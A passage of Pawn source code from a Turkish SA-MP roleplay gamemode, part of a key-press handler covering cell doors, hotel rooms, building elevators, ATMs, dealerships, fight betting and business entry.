					MoveStroyObject(lspdkodes[0],199.8965,103.4586,958.6868,2.0);
					lspdkodes[0] = 0;
				}
			}

			else if(PlayerToPoint(2.0, playerid,196.4070,103.4971,958.6868))
			{
			    if(lspdkodes[1] == 0)
			    {
					MoveStroyObject(lspdkodes[1],197.6670,103.4971,958.6868,2.0);
					lspdkodes[1] = 1;
				}
				else
				{
					MoveStroyObject(lspdkodes[1],196.4070,103.4971,958.6868,2.0);
					lspdkodes[1] = 0;
				}
			}

			else if(PlayerToPoint(2.0, playerid,188.2365,107.1839,958.6876))
			{
			    if(lspdkodes[2] == 0)
			    {
					MoveStroyObject(lspdkodes[2],186.9165,107.1839,958.6876,2.0);
					lspdkodes[2] = 1;
				}
				else
				{
					MoveStroyObject(lspdkodes[2],188.2365,107.1839,958.6876,2.0);
					lspdkodes[2] = 0;
				}
			}

			else if(PlayerToPoint(2.0, playerid,188.2281,110.8808,958.6879))
			{
			    if(lspdkodes[3] == 0)
			    {
					MoveStroyObject(lspdkodes[3],186.8681,110.8808,958.6879,2.0);
					lspdkodes[3] = 1;
				}
				else
				{
					MoveStroyObject(lspdkodes[3],188.2281,110.8808,958.6879,2.0);
					lspdkodes[3] = 0;
				}
			}

			else if(PlayerToPoint(2.0, playerid,193.2098,110.9184,958.6873))
			{
			    if(lspdkodes[4] == 0)
			    {
					MoveStroyObject(lspdkodes[4],191.8898,110.9184,958.6873,2.0);
					lspdkodes[4] = 1;
				}
				else
				{
					MoveStroyObject(lspdkodes[4],193.2098,110.9184,958.6873,2.0);
					lspdkodes[4] = 0;
				}
			}

			else if(PlayerToPoint(2.0, playerid,193.20641, 107.17330, 958.68732))
			{
			    if(lspdkodes[5] == 0)
			    {
					MoveStroyObject(lspdkodes[5],191.74640, 107.17330, 958.68732,2.0);
					lspdkodes[5] = 1;
				}
				else
				{
					MoveStroyObject(lspdkodes[5],193.20641, 107.17330, 958.68732,2.0);
					lspdkodes[5] = 0;
				}
			}
			else if(PlayerToPoint(2.0, playerid,240.68280, -895.26752, 640.32617))
			{
			    if(lspdkodes[6] == 0)
			    {
					MoveStroyObject(lspdkodes[6],242.10310, -895.28918, 640.32617,2.0);
					lspdkodes[6] = 1;
				}
				else
				{
					MoveStroyObject(lspdkodes[6],240.68280, -895.26752, 640.32617,2.0);
					lspdkodes[6] = 0;
				}
			}
		}
	}
	if(PRESSED(KEY_JUMP))
	{
	    if(KutuTasiyor[playerid] != 0)
	    {
	        DONDUR(playerid);
	        COZ(playerid);
	    }
	}
	if ((newkeys & CCKey) && !(oldkeys & CCKey) && IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER && Arac[GetPlayerVehicleID(playerid)][ahizsabit] == 1)
    {
    	new vid = GetPlayerVehicleID(playerid);
        if (GetVehicleSpeed(vid) == 0) return false;
        new Float:x, Float:y, Float:z;
        GetVehicleVelocity(vid, x, y, z);
        GetVehicleZAngle(vid, PlayerHeadingAngle[playerid]);
        DistanceFlat(0, 0, x, y, PlayerCruiseSpeed[playerid]);
        SetTimerEx("CruiseControl", 500, false, "d", playerid);
        Bilgi(playerid, "Hýz sabitleme aktif."); // === Remove this if not needed ===
	}
    else if (PlayerCruiseSpeed[playerid] != 0.00 && (newkeys & KEY_HANDBRAKE))
    {
    	PlayerCruiseSpeed[playerid] = 0.00;
    }
	if(PRESSED(KEY_HANDBRAKE))
	{
	    if(IsPlayerConnected(playerid))
		{
		    if(AnimasyonYapiyor[playerid] == true && !IsPlayerInAnyVehicle(playerid))
			{
				ApplyAnimation(playerid, "CARRY", "crry_prtial", 1.0, 0, 0, 0, 0, 0);
         		ClearAnimations(playerid);
         		if(gOtur[playerid]) { gOtur[playerid] = false; ApplyAnimation(playerid,"PED","SEAT_up",4.1,0,1,1,0,0,1); }
         		AnimasyonYapiyor[playerid] = false;
			}
		}
	}
	if(PRESSED(KEY_YES))
	{
	    if(GetPlayerVirtualWorld(playerid) <= 20 && GetPlayerInterior(playerid) == 1) {
		    for(new i=0;i<sizeof(OtelKapiPos);i++) {
				if(IsPlayerInRangeOfPoint(playerid, 1.0, OtelKapiPos[i][0], OtelKapiPos[i][1], OtelKapiPos[i][2])) {
				    new otelid = (12*GetPlayerVirtualWorld(playerid))-(12-i+1)+1;
					if(Otel[otelid][kilitli]) return Hata(playerid, "Oda kilitli.");
	    			DONDUR(playerid);
					SetPlayerPos(playerid, OtelOdaPos[Otel[otelid][otip]-1][0], OtelOdaPos[Otel[otelid][otip]-1][1], OtelOdaPos[Otel[otelid][otip]-1][2]);
					SetPlayerFacingAngle(playerid, OtelOdaPos[Otel[otelid][otip]-1][3]);
                    SetPlayerInterior(playerid, OtelOdaInterior[Otel[otelid][otip]-1]);
					SetPlayerVirtualWorld(playerid, otelid);
					UnfreezeTimerVar[playerid] = SetTimerEx("UnfreezeTimer", 3000, false, "u", playerid);
				}
			}
		}
		if(GetPlayerInterior(playerid) == 1 || GetPlayerInterior(playerid) == 2) {
		    if(GetPlayerVirtualWorld(playerid) <= 240) {
                for(new i=0;i<sizeof(OtelOdaPos);i++) {
					if(IsPlayerInRangeOfPoint(playerid, 1.0, OtelOdaPos[i][0], OtelOdaPos[i][1], OtelOdaPos[i][2])) {
					    new otelid = GetPlayerVirtualWorld(playerid);
					    new Float:_temp = otelid;
					    new Float:__temp = (_temp/12)-floatround((_temp/12), floatround_floor);
						new _oda = floatround(__temp*12);
						if(Otel[otelid][kilitli]) return Hata(playerid, "Oda kilitli.");
		    			DONDUR(playerid);
						SetPlayerPos(playerid, OtelKapiPos[_oda][0], OtelKapiPos[_oda][1], OtelKapiPos[_oda][2]);
  						SetPlayerFacingAngle(playerid, 180);
	                    SetPlayerInterior(playerid, 1);
						SetPlayerVirtualWorld(playerid, floatround((_temp/12), floatround_ceil));
						UnfreezeTimerVar[playerid] = SetTimerEx("UnfreezeTimer", 3000, false, "u", playerid);
					}
				}
			}
		}
	    if(IsPlayerInRangeOfPoint(playerid, 2.0, 1495.7384,-1540.1769,3398.7405) && GetPlayerInterior(playerid) == 244 && GetPlayerVirtualWorld(playerid) == 567) {
	        ShowPlayerDialog(playerid, 440, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Otel Oda Kirala", "Tek Kiþilik Oda\nÝki Kiþilik Oda\nVIP Oda", "Seç", "Ýptal");
	    }
	    if((IsPlayerInRangeOfPoint(playerid, 2.0, 1489.4712,-1517.5865,3398.7405) && GetPlayerInterior(playerid) == 244 && GetPlayerVirtualWorld(playerid) == 567) || (IsPlayerInRangeOfPoint(playerid, 2.0, 1489.5900,-1517.4100,3306.0044) && GetPlayerVirtualWorld(playerid) <= 20 && GetPlayerInterior(playerid) == 1)) {
			new mstring[1024] = "Giriþ Katý";
			for(new i=1;i<=20;i++) {
				format(mstring, sizeof(mstring), "%s\n%d. Kat", mstring, i);
			}
	        ShowPlayerDialog(playerid, 439, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Otel Asansör", mstring, "Seç", "Ýptal");
	    }
	    if(IsPlayerInRangeOfPoint(playerid, 2, 2.0582 ,-2.9572, 999.4284) && GetPlayerInterior(playerid) == 2 && IsValidVehicle(GetPlayerVirtualWorld(playerid)))
	    {
	        DONDUR(playerid);
	        new vid = GetPlayerVirtualWorld(playerid);
	        new Float:vPos[3];
	        GetVehiclePos(vid, vPos[0], vPos[1], vPos[2]);
	        SetPlayerPos(playerid, vPos[0]+1, vPos[1], vPos[2]);
			SetPlayerInterior(playerid, Arac[vid][ainterior]);
			SetPlayerVirtualWorld(playerid, GetVehicleVirtualWorld(vid));
			COZ(playerid);
	    }
	    if(IsPlayerInRangeOfPoint(playerid, 2, 2.6972,33.3093,1199.5938) && GetPlayerInterior(playerid) == 1 && IsValidVehicle(GetPlayerVirtualWorld(playerid)))
	    {
	        DONDUR(playerid);
	        new vid = GetPlayerVirtualWorld(playerid);
	        new Float:vPos[3];
	        GetVehiclePos(vid, vPos[0], vPos[1], vPos[2]);
	        SetPlayerPos(playerid, vPos[0]+4, vPos[1]+1, vPos[2]-1);
			SetPlayerInterior(playerid, Arac[vid][ainterior]);
			SetPlayerVirtualWorld(playerid, GetVehicleVirtualWorld(vid));
			COZ(playerid);
	    }
	    if(IsPlayerInRangeOfPoint(playerid, 5, -1265.0060,2427.4622,3501.4866))
	    {
	        ShowPlayerDialog(playerid, 377, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"Polis Departmaný Ýþlem", "Ýþlem\tÜcret\n"NOKTA" Temiz Raporu Al\t150"DOLAR"$\n"NOKTA" Ceza Öde\n"NOKTA" Kefalet Öde\n"NOKTA" Deniz Lisansý Al\t450.000"DOLAR"$\n"NOKTA" Hava Lisansý Al\t650.000"DOLAR"$", "Seç", "Ýptal");
	    }
	    if(IsPlayerInRangeOfPoint(playerid, 3, 148.1217,959.2537,934.7670))
	    {
	        ShowPlayerDialog(playerid, 374, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"Hastane Ýþlem", "Ýþlem\tÜcret\n"NOKTA" Saðlýk Raporu Al\t150"DOLAR"$"C1"\n"NOKTA" Tedavi Ol\t350"DOLAR"$"C1"", "Seç", "Ýptal");
	    }
	    if(GetPlayerTargetDynamicActor(playerid) != 0)
	    {
	        new _nid;
	        for(new i;i<MAX_NPC;i++)
	        {
	            if(NPC[i][nid] == GetPlayerTargetDynamicActor(playerid))
	            {
	                _nid = i;
					break;
				}
	        }
		    if(NPC[_nid][nsahip] != 0)
		    {
		        switch(NPC[_nid][ntip])
		        {
		            case 2:
					{
					    if(Karakter[playerid][sqlid] == NPC[_nid][nsahip])
					    {
					        new _mstring[128],_nstring[10];
					        if(Karakter[playerid][cinsiyet] == 1) _nstring = "Bay";
					        else if(Karakter[playerid][cinsiyet] == 2) _nstring = "Bayan";
					        new _name[MAX_PLAYER_NAME];
					        GetPlayerName(playerid, _name, sizeof(_name));
					        for(new in;in<strlen(_name);in++)
					        {
					            if(_name[in] == '_')
					            {
					                strdel(_name, 0, in+1);
					                break;
					            }
					        }
					        format(_mstring, sizeof(_mstring), "Buyrun %s %s.",_nstring,_name);
					        DynamicActorSay(_nid, _mstring, COLOR_FADE1);
					        new Float:_ang;
					        GetDynamicActorFacingAngle(_nid, _ang);
					        SetDynamicActorFacingAngle(_nid, _ang-90);
					        SetTimerEx("NPCDondur", 2500, false, "d", _nid);
					    }
					}
					case 3:
		            {
		                new _mstring[128],_nstring[16];
					    if(Karakter[playerid][cinsiyet] == 1) _nstring = "beyefendi";
					    else if(Karakter[playerid][cinsiyet] == 2) _nstring = "hanýmefendi";
	        			format(_mstring, sizeof(_mstring), "Merhaba, istediðiniz bir þey var mýydý %s? (*%s)",_nstring,OyuncuAdiniBul(playerid));
	        			DynamicActorSay(_nid, _mstring, COLOR_FADE1);
		            }
		        }
		    }
		}
	    if(IsPlayerInRangeOfPoint(playerid, 5.0, Veriler[balikX], Veriler[balikY], Veriler[balikZ]))
	  	{
	  	    new __random[7],mstring[128];
			format(__random, 7, "%s", RandomLimit(6));
			SetPVarString(playerid, "BalikRandom", __random);
			format(mstring, sizeof(mstring), ""C1"Lütfen aþaðýdaki kodu girin:\n"C2"%s",__random);
			ShowPlayerDialog(playerid, 373, DIALOG_STYLE_INPUT, "Balýkçý: BOT Test",mstring,"Gir","Ýptal");
	  	}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, 1564.6164, -1664.9943, 28.5460))
 		{
			ShowPlayerDialog(playerid, 287, DIALOG_STYLE_LIST, "LSPD Asansör", "Çatý(Buradasýnýz)\nKonferans\nBriefing\nLobi\nEkipman\nSorgu Odasý\nCCTV\nKodesler\nYan Otopark\nAlt Garaj\nGYM\nHavuz", "Seç", "Kapat");
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, -1721.9769, -1543.2437, 1308.8221))
 		{
			ShowPlayerDialog(playerid, 287, DIALOG_STYLE_LIST, "LSPD Asansör", "Çatý\nKonferans(Buradasýnýz)\nBriefing\nLobi\nEkipman\nSorgu Odasý\nCCTV\nKodesler\nYan Otopark\nAlt Garaj\nGYM\nHavuz", "Seç", "Kapat");
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, 398.1203, -131.5005, 1020.5906))
 		{
			ShowPlayerDialog(playerid, 287, DIALOG_STYLE_LIST, "LSPD Asansör", "Çatý\nKonferans\nBriefing(Buradasýnýz)\nLobi\nEkipman\nSorgu Odasý\nCCTV\nKodesler\nYan Otopark\nAlt Garaj\nGYM\nHavuz", "Seç", "Kapat");
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, -1302.2266, 2431.9607, 3501.4861))
 		{
			ShowPlayerDialog(playerid, 287, DIALOG_STYLE_LIST, "LSPD Asansör", "Çatý\nKonferans\nBriefing\nLobi(Buradasýnýz)\nEkipman\nSorgu Odasý\nCCTV\nKodesler\nYan Otopark\nAlt Garaj\nGYM\nHavuz", "Seç", "Kapat");
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, 3603.4602, -542.6646, 943.7070))
 		{
			ShowPlayerDialog(playerid, 287, DIALOG_STYLE_LIST, "LSPD Asansör", "Çatý\nKonferans\nBriefing\nLobi\nEkipman(Buradasýnýz)\nSorgu Odasý\nCCTV\nKodesler\nYan Otopark\nAlt Garaj\nGYM\nHavuz", "Seç", "Kapat");
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, 601.8992, -2272.9316, 886.1508))
 		{
			ShowPlayerDialog(playerid, 287, DIALOG_STYLE_LIST, "LSPD Asansör", "Çatý\nKonferans\nBriefing\nLobi\nEkipman\nSorgu Odasý(Buradasýnýz)\nCCTV\nKodesler\nYan Otopark\nAlt Garaj\nGYM\nHavuz", "Seç", "Kapat");
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, 371.8300, 27.0650, 1011.5668))
 		{
			ShowPlayerDialog(playerid, 287, DIALOG_STYLE_LIST, "LSPD Asansör", "Çatý\nKonferans\nBriefing\nLobi\nEkipman\nSorgu Odasý\nCCTV(Buradasýnýz)\nKodesler\nYan Otopark\nAlt Garaj\nGYM\nHavuz", "Seç", "Kapat");
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, -728.5673, -2957.8349, 1197.7346))
 		{
			ShowPlayerDialog(playerid, 287, DIALOG_STYLE_LIST, "LSPD Asansör", "Çatý\nKonferans\nBriefing\nLobi\nEkipman\nSorgu Odasý\nCCTV\nKodesler(Buradasýnýz)\nYan Otopark\nAlt Garaj\nGYM\nHavuz", "Seç", "Kapat");
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, 1579.9252, -1637.0314, 13.5520) && Birlik[Karakter[playerid][birlik]][ftip] == LSPD)
 		{
			ShowPlayerDialog(playerid, 287, DIALOG_STYLE_LIST, "LSPD Asansör", "Çatý\nKonferans\nBriefing\nLobi\nEkipman\nSorgu Odasý\nCCTV\nKodesler\nYan Otopark(Buradasýnýz)\nAlt Garaj\nGYM\nHavuz", "Seç", "Kapat");
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, 1568.5881, -1690.2446, 5.8906))
 		{
			ShowPlayerDialog(playerid, 287, DIALOG_STYLE_LIST, "LSPD Asansör", "Çatý\nKonferans\nBriefing\nLobi\nEkipman\nSorgu Odasý\nCCTV\nKodesler\nYan Otopark\nAlt Garaj(Buradasýnýz)\nGYM\nHavuz", "Seç", "Kapat");
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, 2182.8093, -958.1903, 1071.0654))
 		{
			ShowPlayerDialog(playerid, 287, DIALOG_STYLE_LIST, "LSPD Asansör", "Çatý\nKonferans\nBriefing\nLobi\nEkipman\nSorgu Odasý\nCCTV\nKodesler\nYan Otopark\nAlt Garaj\nGYM(Buradasýnýz)\nHavuz", "Seç", "Kapat");
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, 4792.2128, 1276.0113, 2.0049))
 		{
			ShowPlayerDialog(playerid, 287, DIALOG_STYLE_LIST, "LSPD Asansör", "Çatý\nKonferans\nBriefing\nLobi\nEkipman\nSorgu Odasý\nCCTV\nKodesler\nYan Otopark\nAlt Garaj\nGYM\nHavuz(Buradasýnýz)", "Seç", "Kapat");
		}
		//lsmd
		if(IsPlayerInRangeOfPoint(playerid, 1.5, 181.0838,959.3849,934.8640))
 		{
			ShowPlayerDialog(playerid, 645, DIALOG_STYLE_LIST, "LSMD Asansör", "Lobi(Buradasýnýz)\nBaþhekim Odasý\nMuayene Odasý 1\nMuayene Odasý 2\nTerapi Odasý 1\nTerapi Odasý 2\nToplantý Odasý\nAmeliyathaneler\nDinlenme Odalarý\nKafeterya\nEðitim Odasý\nMorg\nGaraj", "Seç", "Kapat");
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, -328.841857,886.876770,1145.136840))
 		{
			ShowPlayerDialog(playerid, 645, DIALOG_STYLE_LIST, "LSMD Asansör", "Lobi\nBaþhekim Odasý(Buradasýnýz)\nMuayene Odasý 1\nMuayene Odasý 2\nTerapi Odasý 1\nTerapi Odasý 2\nToplantý Odasý\nAmeliyathaneler\nDinlenme Odalarý\nKafeterya\nEðitim Odasý\nMorg\nGaraj", "Seç", "Kapat");
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, 507.553283,1898.198242,806.363891))
 		{
			ShowPlayerDialog(playerid, 645, DIALOG_STYLE_LIST, "LSMD Asansör", "Lobi\nBaþhekim Odasý\nMuayene Odasý 1(Buradasýnýz)\nMuayene Odasý 2\nTerapi Odasý 1\nTerapi Odasý 2\nToplantý Odasý\nAmeliyathaneler\nDinlenme Odalarý\nKafeterya\nEðitim Odasý\nMorg\nGaraj", "Seç", "Kapat");
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, 507.792144,1934.146972,816.185729))
 		{
			ShowPlayerDialog(playerid, 645, DIALOG_STYLE_LIST, "LSMD Asansör", "Lobi\nBaþhekim Odasý\nMuayene Odasý 1\nMuayene Odasý 2(Buradasýnýz)\nTerapi Odasý 1\nTerapi Odasý 2\nToplantý Odasý\nAmeliyathaneler\nDinlenme Odalarý\nKafeterya\nEðitim Odasý\nMorg\nGaraj", "Seç", "Kapat");
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, 507.521362,1969.376098,822.405700))
 		{
			ShowPlayerDialog(playerid, 645, DIALOG_STYLE_LIST, "LSMD Asansör", "Lobi\nBaþhekim Odasý\nMuayene Odasý 1\nMuayene Odasý 2\nTerapi Odasý 1(Buradasýnýz)\nTerapi Odasý 2\nToplantý Odasý\nAmeliyathaneler\nDinlenme Odalarý\nKafeterya\nEðitim Odasý\nMorg\nGaraj", "Seç", "Kapat");
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, 548.167358,1969.330810,822.425720))
 		{
			ShowPlayerDialog(playerid, 645, DIALOG_STYLE_LIST, "LSMD Asansör", "Lobi\nBaþhekim Odasý\nMuayene Odasý 1\nMuayene Odasý 2\nTerapi Odasý 1\nTerapi Odasý 2(Buradasýnýz)\nToplantý Odasý\nAmeliyathaneler\nDinlenme Odalarý\nKafeterya\nEðitim Odasý\nMorg\nGaraj", "Seç", "Kapat");
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, -380.070129,964.140625,1170.181640))
 		{
			ShowPlayerDialog(playerid, 645, DIALOG_STYLE_LIST, "LSMD Asansör", "Lobi\nBaþhekim Odasý\nMuayene Odasý 1\nMuayene Odasý 2\nTerapi Odasý 1\nTerapi Odasý 2\nToplantý Odasý(Buradasýnýz)\nAmeliyathaneler\nDinlenme Odalarý\nKafeterya\nEðitim Odasý\nMorg\nGaraj", "Seç", "Kapat");
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, 937.268615,221.167663,858.126159))
 		{
			ShowPlayerDialog(playerid, 645, DIALOG_STYLE_LIST, "LSMD Asansör", "Lobi\nBaþhekim Odasý\nMuayene Odasý 1\nMuayene Odasý 2\nTerapi Odasý 1\nTerapi Odasý 2\nToplantý Odasý\nAmeliyathaneler(Buradasýnýz)\nDinlenme Odalarý\nKafeterya\nEðitim Odasý\nMorg\nGaraj", "Seç", "Kapat");
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, -609.147399,428.328338,1499.911132))
 		{
			ShowPlayerDialog(playerid, 645, DIALOG_STYLE_LIST, "LSMD Asansör", "Lobi\nBaþhekim Odasý\nMuayene Odasý 1\nMuayene Odasý 2\nTerapi Odasý 1\nTerapi Odasý 2\nToplantý Odasý\nAmeliyathaneler\nDinlenme Odalarý(Buradasýnýz)\nKafeterya\nEðitim Odasý\nMorg\nGaraj", "Seç", "Kapat");
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, -890.693847,780.902038,1422.468505))
 		{
			ShowPlayerDialog(playerid, 645, DIALOG_STYLE_LIST, "LSMD Asansör", "Lobi\nBaþhekim Odasý\nMuayene Odasý 1\nMuayene Odasý 2\nTerapi Odasý 1\nTerapi Odasý 2\nToplantý Odasý\nAmeliyathaneler\nDinlenme Odalarý\nKafeterya(Buradasýnýz)\nEðitim Odasý\nMorg\nGaraj", "Seç", "Kapat");
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, -380.018554,883.632141,1158.043579))
 		{
			ShowPlayerDialog(playerid, 645, DIALOG_STYLE_LIST, "LSMD Asansör", "Lobi\nBaþhekim Odasý\nMuayene Odasý 1\nMuayene Odasý 2\nTerapi Odasý 1\nTerapi Odasý 2\nToplantý Odasý\nAmeliyathaneler\nDinlenme Odalarý\nKafeterya\nEðitim Odasý(Buradasýnýz)\nMorg\nGaraj", "Seç", "Kapat");
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, 866.298767,174.518722,897.927062))
 		{
			ShowPlayerDialog(playerid, 645, DIALOG_STYLE_LIST, "LSMD Asansör", "Lobi\nBaþhekim Odasý\nMuayene Odasý 1\nMuayene Odasý 2\nTerapi Odasý 1\nTerapi Odasý 2\nToplantý Odasý\nAmeliyathaneler\nDinlenme Odalarý\nKafeterya\nEðitim Odasý\nMorg(Buradasýnýz)\nGaraj", "Seç", "Kapat");
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, 300.7304,-1528.6063,24.9229))
 		{
			ShowPlayerDialog(playerid, 645, DIALOG_STYLE_LIST, "LSMD Asansör", "Lobi\nBaþhekim Odasý\nMuayene Odasý 1\nMuayene Odasý 2\nTerapi Odasý 1\nTerapi Odasý 2\nToplantý Odasý\nAmeliyathaneler\nDinlenme Odalarý\nKafeterya\nEðitim Odasý\nMorg\nGaraj(Buradasýnýz)", "Seç", "Kapat");
		}
		//lsfd
		if(IsPlayerInRangeOfPoint(playerid, 1.5, 1270.8773,-1245.4722,13.6414))
 		{
			ShowPlayerDialog(playerid, 646, DIALOG_STYLE_LIST, "LSFD Asansör", "Zemin Kat(Buradasýnýz)\n1. Kat\nÇatý Katý", "Seç", "Kapat");
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, 1272.4161,-1245.5004,19.2145))
 		{
			ShowPlayerDialog(playerid, 646, DIALOG_STYLE_LIST, "LSFD Asansör", "Zemin Kat\n1. Kat(Buradasýnýz)\nÇatý Katý", "Seç", "Kapat");
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, 1235.2213,-1236.7312,25.8706))
 		{
			ShowPlayerDialog(playerid, 646, DIALOG_STYLE_LIST, "LSFD Asansör", "Zemin Kat\n1. Kat\nÇatý Katý(Buradasýnýz)", "Seç", "Kapat");
		}
	    for(new adm; adm < MAX_ATM; adm++)
	    {
	        if(ATM[adm][atmx] != 0 && ATM[adm][atmy] != 0 && ATM[adm][atmz] != 0)
	        {
		        if(IsPlayerInRangeOfPoint(playerid, 2.0, ATM[adm][atmx], ATM[adm][atmy], ATM[adm][atmz]))
		        {
		            if(IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Araç içinde bu komutu kullanamazsýnýz.");
		            if(Karakter[playerid][hesapno] == 0)
		            {
		                Hata(playerid, "Banka hesabýnýz yok.");
					}
					else
					{
					    new string[128];
						format(string,sizeof(string),"{FFFFFF}Hoþgeldiniz!\nHesap No: %d\nHesabýnýzda Bulunan Para Miktarý: %d",Karakter[playerid][hesapno],BankaPara(playerid));
						ShowPlayerDialog(playerid, 127, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Santos Bank", string, "Ýleri", "Kapat");
					}
					break;
				}
			}
		}
		if(IsPlayerInRangeOfPoint(playerid, 3.0, 1957.14, -2183.61, 13.54))
	    {
	        ShowModelSelectionMenu2(playerid, uliste, "Hava Galeri");
	        return 1;
	    }
		if(IsPlayerInRangeOfPoint(playerid, 3.0, 926.09, -2141.06, 2.01))
	    {
	        ShowModelSelectionMenu2(playerid, bliste, "Deniz Galeri");
	        return 1;
	    }
	    if(IsPlayerInRangeOfPoint(playerid, 3.0, Veriler[gposx], Veriler[gposy], Veriler[gposz]))
	    {
			if(Veriler[gdurum] == 1)
		  	{
		    	Hata(playerid, "Galeri bir süreliðine pasif durumdadýr, araç satýþý yasaklanmýþtýr.");
				return 1;
			}
			else
			{
			    if(Karakter[playerid][ehliyet] != 1) return Hata(playerid, "Galeriden araç satýn almak için ehliyetinizin bulunmasý gerekiyor.");
				ShowModelSelectionMenu2(playerid, aliste, "Galeri");
				return 1;
			}
		}
	    if(IsPlayerInRangeOfPoint(playerid, 3, 2622.1663,-1591.1311,-71.1094) || IsPlayerInRangeOfPoint(playerid, 3, 2616.4473,-1589.2343,-71.0975))
		{
		    if(!dovus) return Hata(playerid, "Dövüþ baþlamamýþ.");
		    if(dovusex) return Hata(playerid, "Dövüþ baþlamýþ.");
			if(bahistip[playerid] != 0) return Hata(playerid, "Zaten bahis yatýrmýþsýnýz.");
			new mstring[128];
			format(mstring, sizeof(mstring), "Dövüþ\t{B3B3B3}Mavi Taraf\t[ {B3B3B3}%s{FFFFFF} ]\nDövüþ\t{B3B3B3}Kýrmýzý Taraf\t[ {B3B3B3}%s{FFFFFF} ]",OyuncuAdiniBul(mavitaraf),OyuncuAdiniBul(kirmizitaraf));
			ShowPlayerDialog(playerid, 248, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Dövüþ", mstring, "Bahis Yatýr", "Ýptal");
		}
		if(IsPlayerInRangeOfPoint(playerid,1,2138.0325,-2282.0972,20.6719))
		{
 			SetPlayerPos(playerid,2136.4189,-2283.4685,20.2734);
		}
		if(IsPlayerInRangeOfPoint(playerid,1,2136.4189,-2283.4685,20.2734))
		{
		    SetPlayerPos(playerid,2138.0325,-2282.0972,20.6719);
		}
 		if(IsPlayerInRangeOfPoint(playerid, 1.5, 1439.7930,-1770.4307,-25.2172))
		{
   			SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   			TogglePlayerControllable(playerid, 0);
		    SetPlayerPos(playerid, 1539.8502,-1816.1190,33.4297);
		    SetPlayerInteriorEx(playerid, 0);
		    SetPlayerVirtualWorld(playerid, 0);
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.5, 1539.8502,-1816.1190,33.4297))
		{
   			SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   			TogglePlayerControllable(playerid, 0);
		    SetPlayerPos(playerid, 1439.7930,-1770.4307,-25.2172);
		    SetPlayerInteriorEx(playerid, 1);
		    SetPlayerVirtualWorld(playerid, 360);
		}
	  	if(IsPlayerInRangeOfPoint(playerid, 5.0, Veriler[ehliyetX], Veriler[ehliyetY], Veriler[ehliyetZ]))
  		{
  		    //if(Karakter[playerid][meslek] != 0) return Hata(playerid, "Yeni bir mesleðe katýlmadan önce bulunduðunuz meslekten ayrýlmalýsýnýz. (( /meslekayril ))");
		  	ShowPlayerDialog(playerid, 500, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Ehliyet Testi", ""C1"Ehliyet testi ücreti 150"DOLAR"$"C1"'dýr.\nEhliyet testine girmek istiyor musunuz:", "Evet", "Hayýr");
	  	}
		foreach(new i : Business)
		{
	        if(PlayerToPoint(1.5, playerid, Isyeri[i][girisX], Isyeri[i][girisY], Isyeri[i][girisZ]) && !IsPlayerInAnyVehicle(playerid))
	        {
	            if(GetPlayerVirtualWorld(playerid) == Isyeri[i][igirisvw])
	            {
	                if(Isyeri[i][muhur] == 1) return Hata(playerid, "Bu iþyeri mühürlü.");
	                if(Isyeri[i][ivergi] >= Isyeri[i][ifiyat]*35/100) return Hata(playerid, "Bu iþyeri vergi kilidinde.");
                    /*if(Buysa("~g~~h~banka",Isyeri[i][iad]))
					{
					    if(!BankaSaat()) return Hata(playerid, "Bu saatte bankaya giremezsiniz, çalýþma saatleri: 11:00 - 21:00");
                    }*/
	                if(Isyeri[i][ikilit] == 0)
	                {
	                    if(GetPlayerCash(playerid)-Isyeri[i][girisucreti] >= 0)
	                    {
							new string[128];
		                    SetPlayerPos(playerid, Isyeri[i][cikisX], Isyeri[i][cikisY], Isyeri[i][cikisZ]);
		                    SetPlayerInteriorEx(playerid, Isyeri[i][icikisint]);
		                    SetPlayerVirtualWorld(playerid, Isyeri[i][icikisvw]);
		                    SetPlayerFacingAngle(playerid, Isyeri[i][cikisangle]);
		                    TogglePlayerControllable(playerid, 0);
		                    SetTimerEx("CozEvladim", 3000, 0, "i", playerid);
		                    if(!isnull(Isyeri[i][imuzik])) PlayAudioStreamForPlayer(playerid, Isyeri[i][imuzik]);
		                    if(Isyeri[i][girisucreti] > 0 && !IsyeriYetkilisi(playerid, i) && !Karakter[playerid][isbasi] && !Karakter[playerid][medisbasi])
	  						{
				    		    new mstring[64];
				    		    format(mstring, sizeof(mstring), "Ýþyerinin giriþi ücretli olduðu %d$ kesildi.", Isyeri[i][girisucreti]);
								Bilgi(playerid, mstring);
								GivePlayerCash(playerid, -Isyeri[i][girisucreti]);
